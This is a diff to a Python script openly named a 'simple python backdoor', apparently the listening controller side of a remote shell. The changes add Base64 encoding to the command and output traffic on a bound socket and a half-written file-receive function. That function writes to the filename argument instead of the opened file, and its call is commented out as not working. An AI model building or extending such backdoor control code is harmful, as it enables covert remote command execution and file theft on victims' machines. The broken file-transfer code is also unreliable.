@@ -20,11 +20,17 @@ PORT = 33434
 
 
 def _base64_encode(message):
-    return base64.b64encode(message)
+
+    """Encode the bytes-like object s using Base64 and return a bytes object."""
+
+    return base64.b64encode(message.encode())
 
 
 def _base64_decode(message):
-    return base64.b64decode(message)
+
+    """Decode the Base64 encoded bytes-like object and return a ASCII string."""
+
+    return base64.b64decode(message).decode()
 
 
 def simple_python_backdoor_create_socket():
@@ -46,6 +52,10 @@ def simple_python_backdoor_socket_bind(sock):
     except socket.error() as str_error:
         print(f'Error binding socket {str_error}.\nRetrying...')
 
+def simple_python_backdoor_recv_file(data, file):
+
+    with open(file, 'wb') as _file:
+        file.write(data)
 
 def main():
 
@@ -62,10 +72,17 @@ def main():
 
     while True:
         data = connection.recv(CHUNKS)
-        str_data = data.decode('cp1252')
-        print(str_data)
+        str_data = _base64_decode(data)
+
+        #TODO: Function copy not workin.
+        if str_data == 'Attempting download...':
+            pass
+            # simple_python_backdoor_recv_file(str_data, 'recvice_file')
+        else:
+            print(str_data)
+
         command = input('Shell >>> ').lower()
-        output = _base64_encode(command.encode())
+        output = _base64_encode(command)
         connection.send(output)
 
 
